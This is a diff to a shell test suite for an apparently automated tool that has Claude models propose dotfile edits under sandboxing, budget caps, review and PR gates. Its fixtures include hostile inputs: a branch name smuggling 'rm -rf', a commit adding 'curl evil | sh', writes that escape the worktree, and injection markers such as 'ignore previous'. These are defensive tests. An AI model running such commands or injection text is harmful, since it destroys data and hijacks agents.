@@ -52,7 +52,8 @@ stub = os.environ["STUB"]
 argv = sys.argv[1:]
 prompt = sys.stdin.read()
 n = len(os.listdir(f"{stub}/calls"))
-json.dump({"argv": argv, "cwd": os.getcwd(), "prompt": prompt, "env": sorted(os.environ)},
+json.dump({"argv": argv, "cwd": os.getcwd(), "prompt": prompt, "env": sorted(os.environ), "listing": sorted(os.listdir(".")),
+           "no_claude_mds": os.environ.get("CLAUDE_CODE_DISABLE_CLAUDE_MDS")},
           open(f"{stub}/calls/{n:02d}.json", "w"))
 ids = re.findall(r"^finding: (\S+)$", prompt, re.M)
 cost = float(open(f"{stub}/cost").read()) if os.path.exists(f"{stub}/cost") else 0.11
@@ -65,6 +66,10 @@ else:
     slug = re.sub(r"[^A-Za-z0-9.-]", "_", ids[0])
     mode = open(f"{stub}/mode/{slug}").read().strip() if os.path.exists(f"{stub}/mode/{slug}") else ""
     if mode == "timeout":
+        time.sleep(30)
+    if mode == "orphan":
+        # A grandchild in its own session keeps the output pipe open after the group is killed.
+        subprocess.Popen(["sleep", "25"], start_new_session=True)
         time.sleep(30)
     script = f"{stub}/edit/{slug}.sh"
     if os.path.exists(script):
@@ -514,21 +519,21 @@ reset_store
 
 # ── Gates ──
 # An audit PR is already open: a weekly run stops there.
-echo '[{"number": 40, "headRefName": "chore/agent-audit-2026-10-05"}]' >"$stub/gh/pr-list-open.json"
+echo '[{"number": 40, "headRefName": "chore/agent-audit-2026-10-05", "headRepositoryOwner": {"login": "acme"}}]' >"$stub/gh/pr-list-open.json"
 run 0 run --window weekly --dry-run
 [ "$(field result)" = stopped ] && [ "$(field stopped)" = open-pr ] || fail "an open audit PR must stop a weekly run" "$(cat "$out")"
 [ "$(gate open-pr)" = "stop,#40 open" ] || fail "open-pr gate detail" "$(cat "$out")"
-grep -qF '["pr", "list", "--repo", "acme/dotfiles", "--label", "agent-audit", "--state", "open"' "$stub/gh.log" || fail "open-PR query" "$(ghlog)"
+grep -qF '["pr", "list", "--repo", "acme/dotfiles", "--label", "agent-audit", "--state", "open", "--json", "number,headRefName,headRepositoryOwner"' "$stub/gh.log" || fail "open-PR query" "$(ghlog)"
 # A daily run with a critical finding may add to it.
 run 0 run --window daily --dry-run
 [ "$(gate open-pr)" = "ok,append to #40" ] || fail "a critical daily run may append" "$(cat "$out")"
 [ "$(field result)" = dry-run ] || fail "daily append dry run" "$(cat "$out")"
 # A head branch this tool would not have made is not trusted.
-echo '[{"number": 40, "headRefName": "feat/x; rm -rf"}]' >"$stub/gh/pr-list-open.json"
+echo '[{"number": 40, "headRefName": "feat/x; rm -rf", "headRepositoryOwner": {"login": "acme"}}]' >"$stub/gh/pr-list-open.json"
 run 0 run --window daily --dry-run
 [ "$(field stopped)" = open-pr ] || fail "a foreign head branch must stop the run" "$(cat "$out")"
 grep -q "rm -rf" "$out" "$err" && fail "a hostile branch name was echoed"
-echo '[{"number": 40, "headRefName": "chore/agent-audit-2026-10-05"}, {"number": 39, "headRefName": "chore/agent-audit-2026-10-01"}]' >"$stub/gh/pr-list-open.json"
+echo '[{"number": 40, "headRefName": "chore/agent-audit-2026-10-05", "headRepositoryOwner": {"login": "acme"}}, {"number": 39, "headRefName": "chore/agent-audit-2026-10-01", "headRepositoryOwner": {"login": "acme"}}]' >"$stub/gh/pr-list-open.json"
 run 0 run --window daily --dry-run
 [ "$(field stopped)" = open-pr ] || fail "two open audit PRs must stop the run" "$(cat "$out")"
 echo 'not json' >"$stub/gh/pr-list-open.json"
@@ -732,9 +737,9 @@ run 0 run --window weekly
 [ "$(row unattributed-sessions:interactive | cut -d, -f6-)" = "proposed,null" ] || fail "unattributed status" "$(cat "$out")"
 [ "$(row unused-plugin:quiet | cut -d, -f6-)" = "rejected,tests_failed" ] || fail "quiet should fail the repo test" "$(cat "$out")"
 [ "$(calls)" = 5 ] || fail "expected four author calls and one review, got $(calls)"
-python3 - "$stub/calls" "$sandbox" "$target" <<'PY' || fail "the model calls are not restricted as designed"
+python3 - "$stub/calls" "$sandbox" "$target" "$tmp/state/propose/review" <<'PY' || fail "the model calls are not restricted as designed"
 import json, os, sys
-d, sandbox, target = sys.argv[1:4]
+d, sandbox, target, review_dir = sys.argv[1:5]
 calls = [json.load(open(os.path.join(d, n))) for n in sorted(os.listdir(d))]
 def val(a, flag):
     return a[a.index(flag) + 1]
@@ -744,21 +749,26 @@ for c in calls:
     for flag in ("--restricted", "--strict-mcp-config", "--disable-slash-commands", "--no-session-persistence"):
         assert flag in a, (flag, a)
     assert val(a, "--output-format") == "json" and int(val(a, "--max-turns")) > 0, a
-    # The worktree is under the directory the tool controls, never the owner's checkout.
-    assert c["cwd"] == os.path.join(sandbox, "chore-agent-audit-2026-10-09") and not c["cwd"].startswith(target), c["cwd"]
     assert not [k for k in c["env"] if "TOKEN" in k or "API_KEY" in k], c["env"]
+    # Belt and braces: restricted mode was seen not to load instruction files; this asks for the same.
+    assert c["no_claude_mds"] == "1", c["no_claude_mds"]
     for banned in ("Bash", "Write", "WebFetch", "WebSearch", "Agent", "Task", "mcp"):
         assert banned not in val(a, "--tools"), a
     assert "bypass" not in val(a, "--permission-mode"), a
 for c in calls[:4]:
     a = c["argv"]
+    # The worktree is under the directory the tool controls, never the owner's checkout.
+    assert c["cwd"] == os.path.join(sandbox, "chore-agent-audit-2026-10-09") and not c["cwd"].startswith(target), c["cwd"]
     # Built from numbers, identifiers and fixed rules: nothing from the files it will read.
     assert "rule 1" not in c["prompt"] and "anywhere you like" not in c["prompt"], c["prompt"]
     assert val(a, "--tools") == "Read,Glob,Grep,Edit" and val(a, "--permission-mode") == "acceptEdits", a
     assert val(a, "--model") == "claude-sonnet-5-5" and val(a, "--max-budget-usd") == "0.50", a
     assert "--json-schema" not in a
 r = calls[4]["argv"]
-assert val(r, "--tools") == "Read,Glob,Grep" and val(r, "--permission-mode") == "dontAsk", r
+# The reviewer gets the diff as data and nothing else: no tools, and an empty
+# directory outside the worktree, so no file the author edited can address it.
+assert val(r, "--tools") == "" and val(r, "--permission-mode") == "dontAsk", r
+assert calls[4]["cwd"] == review_dir and calls[4]["listing"] == [], (calls[4]["cwd"], calls[4]["listing"])
 assert val(r, "--model") == "claude-opus-5-5" and val(r, "--max-budget-usd") == "3.00", r
 schema = json.loads(val(r, "--json-schema"))
 item = schema["properties"]["reviews"]["items"]
@@ -788,7 +798,8 @@ rb show "$branch:$settings" | grep -q '"quiet@' && fail "the commit that failed 
 grep -q "^OK 3 " "$tmp/ci.out" || fail "the checker should have judged three commits" "$(cat "$tmp/ci.out")"
 # Only tests that name the changed file run; the fourth run is the one that failed.
 [ "$(sort -u "$stub/tests.log")" = settings ] || fail "relevant tests only" "$(cat "$stub/tests.log")"
-[ "$(wc -l <"$stub/tests.log")" = 2 ] || fail "the settings test should run for both settings edits" "$(cat "$stub/tests.log")"
+# Once on the untouched base before any spend, then once for each settings edit.
+[ "$(wc -l <"$stub/tests.log")" = 3 ] || fail "the settings test should run on the base and for both settings edits" "$(cat "$stub/tests.log")"
 # The PR: one, labelled, with a body the tool composed.
 python3 - "$stub/gh.log" "$stub/pr-body" <<'PY' || fail "the PR was not opened as designed" "$(ghlog; cat "$stub/pr-body")"
 import json, re, sys
@@ -843,7 +854,7 @@ run 0 run --window weekly
 [ "$(row unused-plugin:caveman | cut -d, -f6-)" = "rejected,protected_path" ] || fail "protected path edit" "$(cat "$out")"
 [ "$(row oversize-instructions:.claude/CLAUDE.md | cut -d, -f6-)" = "rejected,instruction_growth" ] || fail "instruction growth" "$(cat "$out")"
 [ "$(row unattributed-sessions:interactive | cut -d, -f6-)" = "rejected,invisible_unicode" ] || fail "invisible unicode" "$(cat "$out")"
-[ "$(row unused-plugin:quiet | cut -d, -f6-)" = "rejected,no_change" ] || fail "no edit at all" "$(cat "$out")"
+[ "$(row unused-plugin:quiet | cut -d, -f6-)" = "failed,no_change" ] || fail "no edit at all" "$(cat "$out")"
 [ "$(calls)" = 4 ] || fail "nothing to review, yet a review was called"
 no_pr "bad edits"
 [ "$(hist unused-plugin:caveman outcome) $(hist unused-plugin:caveman reason)" = '"rejected" "protected_path"' ] || fail "rejection is not in history" "$(cat "$hist")"
@@ -863,7 +874,7 @@ run 0 run --window weekly
 [ "$(row oversize-instructions:.claude/CLAUDE.md | cut -d, -f6-)" = "rejected,too_large" ] || fail "size cap" "$(cat "$out")"
 [ "$(row unattributed-sessions:interactive | cut -d, -f6-)" = "rejected,outside_target" ] || fail "an edit to another file" "$(cat "$out")"
 [ "$(row unused-plugin:quiet | cut -d, -f6-)" = "rejected,mode_change" ] || fail "mode change" "$(cat "$out")"
-[ ! -e "$stub/tests.log" ] || fail "a test ran against a rejected edit" "$(cat "$stub/tests.log")"
+[ "$(wc -l <"$stub/tests.log")" = 1 ] || fail "only the baseline may run tests when every edit is rejected" "$(cat "$stub/tests.log")"
 no_pr "shape edits"
 
 # A hook change is refused unless the finder is allowed strict changes.
@@ -889,7 +900,7 @@ assert [x for x in calls if x[:3] == ["label", "create", "strict-review"]], call
 PY
 grep -qi "strict" "$stub/pr-body" || fail "the body does not flag the strict commit" "$(cat "$stub/pr-body")"
 # What a strict commit changed is never executed here.
-[ ! -e "$stub/tests.log" ] || fail "a test ran against a changed hook" "$(cat "$stub/tests.log")"
+[ "$(wc -l <"$stub/tests.log")" = 1 ] || fail "a test ran against a changed hook" "$(cat "$stub/tests.log")"
 
 # A write outside the worktree ends the run with nothing shipped.
 for escape in "echo x >../escaped" "echo y >$target/planted" "echo 'gitdir: /tmp/evil' >.git"; do
@@ -913,38 +924,37 @@ echo timeout >"$stub/mode/unused-plugin_caveman"
 echo nocost >"$stub/mode/oversize-instructions_.claude_CLAUDE.md"
 echo exit1 >"$stub/mode/unattributed-sessions_interactive"
 run 0 run --window weekly
-[ "$(row unused-plugin:caveman | cut -d, -f6-)" = "rejected,timeout" ] || fail "timeout" "$(cat "$out")"
+[ "$(row unused-plugin:caveman | cut -d, -f6-)" = "failed,timeout" ] || fail "timeout" "$(cat "$out")"
 [ "$(row oversize-instructions:.claude/CLAUDE.md | cut -d, -f6-)" = "proposed,null" ] || fail "an edit with unknown cost still counts" "$(cat "$out")"
-[ "$(row unattributed-sessions:interactive | cut -d, -f6-)" = "rejected,claude_exit" ] || fail "failed exit" "$(cat "$out")"
+[ "$(row unattributed-sessions:interactive | cut -d, -f6-)" = "failed,claude_exit" ] || fail "failed exit" "$(cat "$out")"
 [ "$(ledger_usd)" = "0.5 0.5 0.11 0.11 0.11" ] || fail "timeout and unknown cost are charged at the cap" "$(cat "$ledger")"
 [ "$(field spent_usd)" = 1.33 ] || fail "run total with capped charges" "$(cat "$out")"
 [ "$(subjects "$branch")" = "chore(agent-audit): trim instruction file home/private_dot_claude/CLAUDE.md" ] || fail "only the surviving edit ships" "$(subjects "$branch")"
 grep -qF '"--title", "chore(agent-audit): 1 finding from the weekly report 2026-10-04"' "$stub/gh.log" || fail "singular title" "$(ghlog)"
 rb show "$branch:home/AGENTS.md" | grep -q "worktrees only" && fail "the edit of a failed call was kept"
 
-# The run stops before a call that could pass its cap, and the review gets what is left.
+# The review gets what the run has left. Room for three at plan time
+# (3 x 0.50 + 1.00 <= 2.60); each reply has no cost, so each is charged 0.50.
 reset_all
 cfg 'caps_usd={"daily": 3, "weekly": 2.6, "monthly": 10}'
-touch "$stub/tests-pass"
+for m in unused-plugin_caveman oversize-instructions_.claude_CLAUDE.md unattributed-sessions_interactive; do echo nocost >"$stub/mode/$m"; done
+run 0 run --window weekly
+[ "$(row unused-plugin:quiet | cut -d, -f6-)" = "skipped,over-cap" ] || fail "fourth finding never fit the cap" "$(cat "$out")"
+[ "$(calls)" = 4 ] || fail "expected three author calls and the review, got $(calls)"
+[ "$(call_arg 03 --max-budget-usd)" = 1.10 ] || fail "the review is capped at what the run has left" "$(call_arg 03 --max-budget-usd)"
+[ "$(field spent_usd)" = 1.61 ] && [ "$(field result)" = proposed ] || fail "capped run result" "$(cat "$out")"
+# A reply that reports more than its call's cap means the cap did not hold:
+# what was reported is booked and the run ends there with nothing shipped.
+reset_all
 echo 0.6 >"$stub/cost"
 run 0 run --window weekly
-# Room for three at plan time (3 x 0.50 + 1.00 <= 2.60); each call then overshoots to 0.60.
-[ "$(row unused-plugin:quiet | cut -d, -f6-)" = "skipped,over-cap" ] || fail "fourth finding never fit the cap" "$(cat "$out")"
-[ "$(row unattributed-sessions:interactive | cut -d, -f6-)" = "not-attempted,run-cap" ] || fail "third call would pass the cap: 1.20 + 0.50 + 1.00" "$(cat "$out")"
-[ "$(calls)" = 3 ] || fail "expected two author calls and the review, got $(calls)"
-[ "$(call_arg 02 --max-budget-usd)" = 1.40 ] || fail "the review is capped at what the run has left" "$(call_arg 02 --max-budget-usd)"
-[ "$(field spent_usd)" = 1.8 ] && [ "$(field result)" = proposed ] || fail "capped run result" "$(cat "$out")"
-[ "$(hist unattributed-sessions:interactive outcome)" = absent ] || fail "a finding never attempted must stay out of history"
-# Too little left for a review: nothing is reviewed, so nothing ships.
-reset_all
-cfg 'caps_usd={"daily": 3, "weekly": 2.6, "monthly": 10}'
-echo 0.9 >"$stub/cost"
-run 0 run --window weekly
-[ "$(field result)" = stopped ] && [ "$(field stopped)" = run-cap ] || fail "0.80 left cannot buy a 1.00 review" "$(cat "$out")"
-[ "$(calls)" = 2 ] || fail "expected two author calls and no review, got $(calls)"
-[ "$(ledger_usd)" = "0.9 0.9" ] || fail "spend before the stop is on the ledger" "$(cat "$ledger")"
-no_pr "run cap"
-store_published "run cap"
+[ "$(field result)" = stopped ] && [ "$(field stopped)" = run-cap ] || fail "a call over its cap must end the run" "$(cat "$out")"
+[ "$(calls)" = 1 ] || fail "a model was called after one overshot its cap, got $(calls)"
+[ "$(ledger_usd)" = "0.6" ] || fail "the reported overshoot is what the ledger holds" "$(cat "$ledger")"
+[ "$(row unused-plugin:caveman | cut -d, -f6-)" = "not-attempted,run-cap" ] || fail "overshoot status" "$(cat "$out")"
+[ "$(hist unused-plugin:caveman outcome)" = absent ] || fail "an overshoot is not a judgement of the finding"
+no_pr "overshoot"
+store_published "overshoot"
 # A cap that cannot hold one edit and a review stops before any call.
 reset_all
 cfg 'caps_usd={"daily": 3, "weekly": 1.2, "monthly": 10}'
@@ -970,7 +980,7 @@ for bad in 'null' '"approve"' "{\"reviews\": [$ok1]}" \
     review "$bad"
     run 0 run --window weekly
     [ "$(field result)" = nothing-survived ] || fail "review output '$bad' let something through" "$(cat "$out" "$err")"
-    [ "$(row unused-plugin:caveman | cut -d, -f6-)" = "rejected,review_failed" ] || fail "review output '$bad' reason" "$(cat "$out")"
+    [ "$(row unused-plugin:caveman | cut -d, -f6-)" = "failed,review_failed" ] || fail "review output '$bad' reason" "$(cat "$out")"
     no_pr "bad review"
     grep -rqF -e "INJECTED" -e "pwned" -e "push --force" -e "ignore previous" "$out" "$err" "$store" "$stub/gh.log" && fail "review text leaked for '$bad'"
     [ "$(ledger_usd)" = "0.11 0.11 0.2" ] || fail "a failed review is still paid for" "$(cat "$ledger")"
@@ -986,7 +996,7 @@ review '{"reviews": [{"finding_id": "unused-plugin:caveman", "verdict": "reject"
 run 0 run --window weekly
 [ "$(field result)" = proposed ] || fail "two approved commits should ship" "$(cat "$out" "$err")"
 [ "$(row unused-plugin:caveman | cut -d, -f6-)" = "rejected,review_rejected" ] || fail "review rejection" "$(cat "$out")"
-[ "$(row unused-plugin:quiet | cut -d, -f6-)" = "rejected,patch_conflict" ] || fail "a patch that needs a rejected commit" "$(cat "$out")"
+[ "$(row unused-plugin:quiet | cut -d, -f6-)" = "failed,patch_conflict" ] || fail "a patch that needs a rejected commit" "$(cat "$out")"
 [ "$(subjects "$branch")" = "chore(agent-audit): steer sessions into repo worktrees
 chore(agent-audit): trim instruction file home/private_dot_claude/CLAUDE.md" ] || fail "rebuilt branch" "$(subjects "$branch")"
 [ "$(rb show "$branch:$settings")" = "$(rb show "main:$settings")" ] || fail "a rejected edit survived the rebuild"
@@ -1009,7 +1019,7 @@ run 1 run --window weekly
 has "pr_failed" "a failed PR creation is not reported"
 [ -z "$(rb for-each-ref 'refs/heads/chore/*')" ] || fail "a pushed branch was left without a PR" "$(rb for-each-ref)"
 clean_local "pr create failure"
-[ "$(hist unused-plugin:caveman outcome) $(hist unused-plugin:caveman reason)" = '"rejected" "pr_failed"' ] || fail "pr failure history" "$(cat "$hist")"
+[ "$(hist unused-plugin:caveman outcome) $(hist unused-plugin:caveman reason)" = '"attempted" "pr_failed"' ] || fail "pr failure history" "$(cat "$hist")"
 store_published "pr create failure"
 # A branch of today's name already on the remote is not overwritten.
 reset_all
@@ -1024,9 +1034,9 @@ run 0 run --window weekly
 # A row left pending by a run that died after opening its PR is attached on the next run.
 reset_all
 write_history "unused-plugin:caveman|2026-10-09T08:00:00Z||pending"
-echo '[{"number": 55}]' >"$stub/gh/pr-list-head.json"
+echo '[{"number": 55, "headRepositoryOwner": {"login": "acme"}}]' >"$stub/gh/pr-list-head.json"
 pr_view 55 OPEN null null unused-plugin:caveman
-echo '[{"number": 55, "headRefName": "chore/agent-audit-2026-10-09"}]' >"$stub/gh/pr-list-open.json"
+echo '[{"number": 55, "headRefName": "chore/agent-audit-2026-10-09", "headRepositoryOwner": {"login": "acme"}}]' >"$stub/gh/pr-list-open.json"
 run 0 run --window weekly
 [ "$(field stopped)" = open-pr ] || fail "expected the open PR to stop this run" "$(cat "$out")"
 [ "$(hist unused-plugin:caveman outcome) $(hist unused-plugin:caveman pr)" = '"open" 55' ] || fail "a pending row was not attached to its PR" "$(cat "$hist")"
@@ -1035,21 +1045,28 @@ store_published "pending reconcile"
 # ── A critical finding on a daily run joins the open PR ──
 reset_all
 open_branch=chore/agent-audit-2026-10-05
-(
-    cd "$target"
-    git checkout -q -b "$open_branch"
-    echo "earlier" >earlier.md
-    git add -A && git commit -q -m "chore(agent-audit): an earlier finding"
-    git push -q origin "$open_branch"
-    git checkout -q main && git branch -q -D "$open_branch"
-)
-echo "[{\"number\": 40, \"headRefName\": \"$open_branch\"}]" >"$stub/gh/pr-list-open.json"
+touch "$stub/tests-pass"
+# open_pr_branch <commit message> <edit command>: an audit branch with one earlier commit.
+open_pr_branch() {
+    (
+        cd "$target"
+        git checkout -q -b "$open_branch"
+        eval "$2"
+        git add -A && git commit -q -m "$1"
+        git push -q origin "$open_branch"
+        git checkout -q main && git branch -q -D "$open_branch"
+    )
+}
+open_pr_branch "chore(agent-audit): disable unused plugin quiet
+
+Finding: unused-plugin:quiet" "sed -i 's/\"remember@official\": false/\"remember@official\": false,\n    \"quiet@market\": false/' $settings"
+echo "[{\"number\": 40, \"headRefName\": \"$open_branch\", \"headRepositoryOwner\": {\"login\": \"acme\"}}]" >"$stub/gh/pr-list-open.json"
 run 0 run --window daily
 [ "$(field result)" = appended ] && [ "$(field pr)" = 40 ] || fail "the daily run did not append" "$(cat "$out" "$err")"
 [ "$(subjects "$open_branch")" = "chore(agent-audit): trim instruction file home/private_dot_claude/CLAUDE.md
 chore(agent-audit): disable unused plugin caveman
 chore(agent-audit): steer sessions into repo worktrees
-chore(agent-audit): an earlier finding" ] || fail "commits added to the open PR's branch" "$(subjects "$open_branch")"
+chore(agent-audit): disable unused plugin quiet" ] || fail "commits added to the open PR's branch" "$(subjects "$open_branch")"
 grep -qF '["pr", "create"' "$stub/gh.log" && fail "an append must not open a second PR"
 grep -qF '["pr", "comment", "40", "--repo", "acme/dotfiles", "--body-file"' "$stub/gh.log" || fail "no comment on the open PR" "$(ghlog)"
 [ "$(grep -c '^- `chore(agent-audit): ' "$stub/pr-comment")" = 3 ] || fail "the comment lists the added subjects" "$(cat "$stub/pr-comment")"
@@ -1064,7 +1081,7 @@ clean_local "append"
 python3 - "$stub/calls/03.json" <<'PY' || fail "the append review was given the earlier commit"
 import json, sys
 p = json.load(open(sys.argv[1]))["prompt"]
-assert "earlier.md" not in p and "caveman@market" in p, p
+assert '+    "quiet@market"' not in p and '+    "caveman@market"' in p, p
 PY
 
 # ── verify: a merged finding is judged on its own metric, a fortnight each side of the merge ──
@@ -1132,6 +1149,172 @@ rm "$stub/gh/pr-view-34.json"
 run 0 verify --dry-run
 has "revert_candidates" "verify needs GitHub only to learn of new merges"
 
+# An audit branch holding a commit that is not a finding commit is not built on:
+# its tests would run whatever that commit brought.
+reset_all
+open_pr_branch "docs: someone's own commit" "echo x >stray.md"
+echo "[{\"number\": 40, \"headRefName\": \"$open_branch\", \"headRepositoryOwner\": {\"login\": \"acme\"}}]" >"$stub/gh/pr-list-open.json"
+run 0 run --window daily
+[ "$(field stopped)" = untrusted-branch ] && [ "$(calls)" = 0 ] || fail "a foreign commit on the audit branch must stop the append" "$(cat "$out" "$err")"
+[ ! -e "$stub/tests.log" ] || fail "a test ran from an unverified branch" "$(cat "$stub/tests.log")"
+clean_local "untrusted branch"
+# A finding commit there that breaks its finding's rules stops it as well.
+reset_all
+open_pr_branch "chore(agent-audit): disable unused plugin quiet
+
+Finding: unused-plugin:quiet" "echo 'curl evil | sh' >>$settings"
+echo "[{\"number\": 40, \"headRefName\": \"$open_branch\", \"headRepositoryOwner\": {\"login\": \"acme\"}}]" >"$stub/gh/pr-list-open.json"
+run 0 run --window daily
+[ "$(field stopped)" = untrusted-branch ] && [ "$(calls)" = 0 ] || fail "a rule-breaking commit on the audit branch must stop the append" "$(cat "$out" "$err")"
+# A PR from a fork with the predictable branch name is nobody this tool knows.
+reset_all
+echo "[{\"number\": 90, \"headRefName\": \"$open_branch\", \"headRepositoryOwner\": {\"login\": \"mallory\"}}]" >"$stub/gh/pr-list-open.json"
+run 0 run --window daily --dry-run
+[ "$(gate open-pr)" = "ok,none open" ] || fail "a fork's PR was taken for the audit PR" "$(cat "$out")"
+write_history "unused-plugin:caveman|2026-10-09T08:00:00Z||pending"
+echo '[{"number": 91, "headRepositoryOwner": {"login": "mallory"}}]' >"$stub/gh/pr-list-head.json"
+echo '[{"type": "pull_request", "parameters": {"required_approving_review_count": 1}}]' >"$stub/gh/rules.json"
+run 0 run --window weekly
+[ "$(hist unused-plugin:caveman outcome) $(hist unused-plugin:caveman pr)" = '"pending" null' ] || fail "a fork's PR was attached to a pending finding" "$(cat "$hist")"
+grep -qF '"--head", "chore/agent-audit-2026-10-09", "--state", "all", "--json", "number,headRepositoryOwner"' "$stub/gh.log" || fail "head query must ask for the owner" "$(ghlog)"
+
+# ── Transient failures are attempts, not verdicts ──
+# A failed call says nothing about the finding: it is tried again next run,
+# and after three attempts in a row it is handed to a person.
+reset_all
+cfg max_findings=1
+echo exit1 >"$stub/mode/unused-plugin_caveman"
+run 0 run --window weekly
+[ "$(row unused-plugin:caveman | cut -d, -f6-)" = "failed,claude_exit" ] || fail "a failed call" "$(cat "$out")"
+[ "$(hist unused-plugin:caveman outcome) $(hist unused-plugin:caveman reason)" = '"attempted" "claude_exit"' ] || fail "a failed call is an attempt in history" "$(cat "$hist")"
+run 0 run --window weekly --dry-run
+[ "$(row unused-plugin:caveman | cut -d, -f6-)" = "planned,null" ] || fail "a failed call must not silence the finding" "$(cat "$out")"
+run 0 run --window weekly
+run 0 run --window weekly
+[ "$(calls)" = 3 ] || fail "three attempts expected, got $(calls)"
+run 0 run --window weekly --dry-run
+[ "$(row unused-plugin:caveman | cut -d, -f6-)" = "needs_human,attempts" ] || fail "after three failed attempts a person is needed" "$(cat "$out")"
+[ "$(row oversize-instructions:.claude/CLAUDE.md | cut -d, -f6-)" = "planned,null" ] || fail "the next finding takes the freed slot" "$(cat "$out")"
+# A success in between starts the count again.
+reset_all
+cfg max_findings=1
+write_history "unused-plugin:caveman|2026-09-01T10:00:00Z||attempted|reason=\"timeout\"" \
+    "unused-plugin:caveman|2026-09-02T10:00:00Z||attempted|reason=\"timeout\"" \
+    "unused-plugin:caveman|2026-06-03T10:00:00Z|9|closed|resolved_at=\"2026-06-04T00:00:00Z\"" \
+    "unused-plugin:caveman|2026-10-01T10:00:00Z||attempted|reason=\"review_failed\""
+run 0 run --window weekly --dry-run
+[ "$(row unused-plugin:caveman | cut -d, -f6-)" = "planned,null" ] || fail "only attempts in a row count" "$(cat "$out")"
+# The budget turning the review away is no verdict either, and leaves no history at all.
+reset_all
+cfg max_findings=1
+cat >>"$stub/edit/unused-plugin_caveman.sh" <<'EOF'
+echo '{"at":"2026-10-09T12:00:00Z","critical":false,"run":"other","usd":60}' >>"$AGENT_METRICS_STORE/ledger/2026-10.jsonl"
+EOF
+run 0 run --window weekly
+[ "$(field result)" = stopped ] && [ "$(field stopped)" = budget ] || fail "a review the budget denies must stop the run" "$(cat "$out" "$err")"
+[ "$(row unused-plugin:caveman | cut -d, -f6-)" = "not-attempted,budget" ] || fail "budget denial status" "$(cat "$out")"
+[ "$(calls)" = 1 ] && [ "$(hist unused-plugin:caveman outcome)" = absent ] || fail "a budget denial must leave no history" "$(cat "$hist" 2>/dev/null)"
+no_pr "review budget denial"
+# A verdict of miss is remembered like a rejection.
+reset_all
+write_history "unused-plugin:caveman|2026-08-01T10:00:00Z|12|merged|merged_at=\"2026-08-20T00:00:00Z\"|verdict=\"miss\"|before=5|after=9|judged_at=\"2026-09-05T00:00:00Z\""
+run 0 run --window weekly --dry-run
+[ "$(row unused-plugin:caveman | cut -d, -f6-)" = "skipped,miss" ] || fail "a finding that missed must not be proposed again within 90 days" "$(cat "$out")"
+
+# ── The repo's tests must pass before anything is paid for ──
+reset_all
+(
+    cd "$target"
+    cat >tests/scripts/test_settings.sh <<'EOF'
+#!/usr/bin/env bash
+# covers modify_settings.json.json.tmpl
+echo settings >>"$STUB/tests.log"
+exit 1
+EOF
+    git commit -q -am "a test that fails on its own" && git push -q
+)
+run 0 run --window weekly
+[ "$(field result)" = stopped ] && [ "$(field stopped)" = baseline-tests ] || fail "a red baseline must stop the run" "$(cat "$out" "$err")"
+[ "$(calls)" = 0 ] && [ ! -e "$ledger" ] || fail "a red baseline must cost nothing"
+[ "$(hist unused-plugin:caveman outcome)" = absent ] || fail "a red baseline must leave no memory" "$(cat "$hist")"
+[ "$(wc -l <"$stub/tests.log")" = 1 ] || fail "the baseline should have run the relevant test once" "$(cat "$stub/tests.log")"
+no_pr "red baseline"
+run 0 run --window weekly --dry-run
+[ "$(row unused-plugin:caveman | cut -d, -f6-)" = "planned,null" ] || fail "a red baseline silenced a finding" "$(cat "$out")"
+
+# ── More failure paths ──
+# The PR body exists before the branch is pushed, so nothing can fail between the two.
+reset_all
+cfg max_findings=1
+cat >"$target/.git/hooks/pre-push" <<EOF
+#!/bin/sh
+[ -s "$tmp/state/propose/pr-body.md" ] && echo ready >"$stub/body-at-push"
+exit 0
+EOF
+chmod +x "$target/.git/hooks/pre-push"
+run 0 run --window weekly
+[ -e "$stub/body-at-push" ] || fail "the PR body was not prepared before the push"
+[ ! -e "$tmp/state/propose/pr-body.md" ] || fail "the body file was left behind"
+# gh reports failure although GitHub made the PR: the branch is kept and the PR adopted.
+reset_all
+cfg max_findings=1
+touch "$stub/gh/pr-create.fail"
+echo '[{"number": 77, "headRepositoryOwner": {"login": "acme"}}]' >"$stub/gh/pr-list-head.json"
+run 0 run --window weekly
+[ "$(field result)" = proposed ] && [ "$(field pr)" = 77 ] || fail "an existing PR for the head must be adopted" "$(cat "$out" "$err")"
+[ -n "$(rb for-each-ref "refs/heads/$branch")" ] || fail "the branch of a PR that exists was deleted"
+[ "$(hist unused-plugin:caveman outcome) $(hist unused-plugin:caveman pr)" = '"open" 77' ] || fail "adopted PR history" "$(cat "$hist")"
+# A local branch of today's name is somebody's work: refuse, and leave it.
+reset_all
+gt branch "$branch"
+run 0 run --window weekly
+[ "$(field stopped)" = local-branch-exists ] && [ "$(calls)" = 0 ] || fail "an existing local branch must stop the run" "$(cat "$out" "$err")"
+gt rev-parse --verify --quiet "refs/heads/$branch" >/dev/null || fail "the existing local branch was destroyed"
+# A branch whose run died before its PR existed is cleaned up once its row expires.
+reset_all
+gt push -q origin "main:refs/heads/chore/agent-audit-2026-10-07"
+write_history "unused-plugin:caveman|2026-10-07T08:00:00Z||pending"
+echo '[{"type": "pull_request", "parameters": {"required_approving_review_count": 1}}]' >"$stub/gh/rules.json"
+run 0 run --window weekly
+[ -z "$(rb for-each-ref 'refs/heads/chore/*')" ] || fail "an orphaned audit branch was left on the remote" "$(rb for-each-ref)"
+[ "$(hist unused-plugin:caveman outcome) $(hist unused-plugin:caveman reason)" = '"attempted" "pr_failed"' ] || fail "expired pending row" "$(cat "$hist")"
+# Classic protection answering 404 without saying "not protected" is not a "no".
+reset_all
+echo "gh: Not Found (HTTP 404)" >"$stub/gh/protection.fail"
+run 0 run --window weekly --dry-run
+[ "$(field stopped)" = review-gate-unknown ] || fail "a bare 404 from branch protection was read as no approval required" "$(cat "$out")"
+# Report values reach history only as numbers and identifiers.
+reset_all
+cfg max_findings=1
+python3 - "$store/reports/2026-10-04-weekly.json" <<'PY'
+import json, sys
+j = json.load(open(sys.argv[1]))
+for f in j["audit"]["instructions"]["files"]:
+    if f["path"] == "~/.claude/CLAUDE.md":
+        f.update(lines=900, bytes={"note": "free text; rm -rf ~"})
+json.dump(j, open(sys.argv[1], "w"))
+PY
+gs commit -q -am "hostile report" && gs push -q
+run 0 run --window weekly
+[ "$(row oversize-instructions:.claude/CLAUDE.md | cut -d, -f6-)" = "proposed,null" ] || fail "hostile-evidence run" "$(cat "$out" "$err")"
+grep -q "free text" "$hist" && fail "free text from a report was stored in history" "$(cat "$hist")"
+[ "$(hist oversize-instructions:.claude/CLAUDE.md evidence)" = '{"bytes": null, "inventory": "2026-10-04-weekly", "lines": 900, "path": "~/.claude/CLAUDE.md"}' ] || fail "stored evidence" "$(hist oversize-instructions:.claude/CLAUDE.md evidence)"
